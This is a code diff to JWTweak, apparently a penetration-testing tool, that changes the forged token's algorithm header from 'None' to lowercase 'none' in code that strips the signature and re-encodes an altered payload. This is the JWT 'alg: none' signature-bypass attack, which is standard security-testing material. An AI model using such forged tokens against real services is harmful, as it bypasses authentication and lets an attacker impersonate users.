@@ -1,4 +1,4 @@
-#JWTweak-v1.5.1
+#JWTweak-v1.6
 
 import os
 import jwt
@@ -39,7 +39,7 @@ def jwtWeak():
             *****************************MAIN MENU*****************************
             1: Detect the algorithm of the input JWT Token
             2: Base64 decode the input JWT Token
-            3: Generate new JWT by changing the algorithm to 'None'
+            3: Generate new JWT by changing the algorithm to 'none'
             4: Generate new JWT by changing the algorithm to 'HS256'
             5: Generate new JWT by changing the algorithm to 'HS384'
             6: Generate new JWT by changing the algorithm to 'HS512'
@@ -128,7 +128,7 @@ def jwtWeak():
                 print(f"{bcolors.FAIL}\nThis is not a JWT Token. Please check again{bcolors.ENDC}\n")
 
 #######################################################################################
-#Generate JWT Token with Algorithm type 'None'
+#Generate JWT Token with Algorithm type 'none'
 #######################################################################################
 
         elif choice == '3':
@@ -156,9 +156,9 @@ def jwtWeak():
                 #base64 encoded Signature
                 print("\nSignature="+Signature)
 
-                print(f"{bcolors.WARNING}\nAfter Algorithm Changed to 'None':{bcolors.ENDC}")
+                print(f"{bcolors.WARNING}\nAfter Algorithm Changed to 'none':{bcolors.ENDC}")
 
-                json_header['alg']='None'
+                json_header['alg']='none'
 
                 str_json_header=json.dumps(json_header)
 
@@ -182,7 +182,7 @@ def jwtWeak():
                     b64_encoded_header = str(b64_Header, "utf-8")
                     b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                     b64_encoded_Payload = str(b64_Payload, "utf-8")
-                    print("\nThe New JWT Token with Algorithm changed to 'None':\n\n"+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+                    print("\nThe New JWT Token with Algorithm changed to 'none':\n\n"+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
                 elif not mod_payload:
                     print(f"{bcolors.OKBLUE}\nThe payload is unchanged{bcolors.ENDC}")
                     json_header=str(json_header)
@@ -192,7 +192,7 @@ def jwtWeak():
                     b64decoded_payload=str(b64decoded_payload)
                     b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                     b64_encoded_Payload = str(b64_Payload, "utf-8")
-                    print("\nThe New JWT Token with Algorithm changed to 'None':\n\n"+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
+                    print("\nThe New JWT Token with Algorithm changed to 'none':\n\n"+f"{bcolors.OKGREEN}"+f"{bcolors.BOLD}"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
                 else:
                     print("Not Valid Payload")
             except:
